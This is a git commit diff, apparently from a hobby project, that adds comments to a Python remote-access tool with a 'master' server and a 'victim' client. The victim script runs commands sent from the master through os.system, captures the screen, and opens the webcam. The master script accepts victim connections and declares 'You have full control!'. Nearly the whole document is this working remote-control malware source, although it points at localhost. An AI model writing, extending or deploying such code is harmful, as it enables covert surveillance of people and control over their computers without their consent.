65b7c12666d6530c5fede42553e1df335097333e
Alexander Denisenko <sashadenisenko6@gmail.com>
2024-07-10 00:04:33 +0300

    added comments

--- master.py
+++ master.py
@@ -2,11 +2,13 @@ import socket
 import shutil
 import os
 
+#consts
 HOST = '127.0.0.1'
 PORT = 8080
 BUFFER_SIZE = 4096
 HASH = 'utf-8'
 
+#recive from the victim the screenshot and save it in the project folder
 def get_screenshot(victim_socket):
     filename = victim_socket.recv(BUFFER_SIZE).decode(HASH)
     fileToUpload = os.path.basename(filename)
@@ -14,36 +16,44 @@ def get_screenshot(victim_socket):
     shutil.copy(filename, destination_path)
 
 def main():
+    #open a socket listening for any connections
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as master_socket:
         master_socket.bind((HOST, PORT))
         master_socket.listen()
         print(f"master is up!\nlistening for any connections on port {PORT}...")
+        
+        #start a small conversation to aproove the connection (logs)
         while True:
             connection, address = master_socket.accept()
             print(f"victim found!\nconnected to {address}...")
             connection.send("connected?".encode(HASH))
             print("MASTER: connected?")
             print("VICTIM: "+connection.recv(BUFFER_SIZE).decode(HASH))
-            
             print("You have full control!")
+            
+            #after the connection is set and aprooved let the user choose a command
             while True:
                 command = input("Enter a command: ")
+                #send the command to the victim and get back form him the screenshot
                 if command == "screenshot":
                     connection.send(command.encode(HASH))
                     get_screenshot(connection)
-                    print("screenshot was taken...")
+                    print("screenshot was taken...")#log
+                #send the cmd command to the victim's cmd and get the screenshot of the command results
                 elif command == "cmd":
                     connection.send(command.encode(HASH))
                     print(connection.recv(BUFFER_SIZE).decode(HASH))
                     cmd_command = input("Enter a cmd command: ")
                     connection.send(cmd_command.encode(HASH))
                     get_screenshot(connection)
-                    print("screenshot was taken...")
+                    print("screenshot was taken...")#log
+                #send the command to the victim to open the webcam and get a screenshot while the webcam is active
                 elif command == "webcam":
                     connection.send(command.encode(HASH))
-                    print("command sent!")
+                    print("command sent!")#log
                     get_screenshot(connection)
-                    print("screeshot was taken...")
+                    print("screeshot was taken...")#log
+                #stop the server after a non-command input
                 else:
                     break
             break
--- victim.py
+++ victim.py
@@ -3,20 +3,24 @@ from  PIL import ImageGrab
 import os
 import cv2
 
+#consts
 MASTER_HOST = '127.0.0.1'
 MASTER_PORT = 8080
 BUFFER_SIZE = 4096
 HASH = 'utf-8'
 
+#take a screenshot and send it to the master
 def take_screenshot(filename, socket):
     screenshot = ImageGrab.grab()
     screenshot.save(filename)
     screenshot.close()
     socket.send(filename.encode(HASH))
 
+#run a command on the victim's cmd
 def cmd_control(command):
     os.system(command)
     
+#open a live webcam window    
 def get_webcam():
     cv2.namedWindow("press ESC to exit")
     vc = cv2.VideoCapture(0)
@@ -37,8 +41,11 @@ def get_webcam():
     cv2.destroyWindow("press ESC to exit")
 
 def main():
+    #open a socket to connect the master (the server)
     with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as victim_socket:
         victim_socket.connect((MASTER_HOST, MASTER_PORT))
+        
+        #start a small conversation to aproove the connection (logs)
         print("master found!")
         if victim_socket.recv(BUFFER_SIZE).decode(HASH) == "connected?":
             print("MASTER: connected?")
@@ -49,15 +56,19 @@ def main():
             print("VICTIM: NO")
             return
         
+        #recive the command from the msater
         remote_command = victim_socket.recv(BUFFER_SIZE).decode(HASH)
+        #take a screenshot, save it as a file and send it to the master
         if remote_command == "screenshot":
             take_screenshot("test.png", victim_socket)
             print("screenshot was taken...")
+        #run the command that the master sent in the current cmd and sent a screenshot of the command results
         elif remote_command == "cmd":
             print("master using cmd...")
             victim_socket.send("victim's cmd is ready to get the command...".encode(HASH))
             cmd_control(victim_socket.recv(BUFFER_SIZE).decode(HASH))
             take_screenshot("cmd.png",victim_socket)
+        #active the victim's webcam and take a screenshot before the webcam closed
         elif remote_command == "webcam":
             get_webcam()
             take_screenshot("webcam.png",victim_socket)
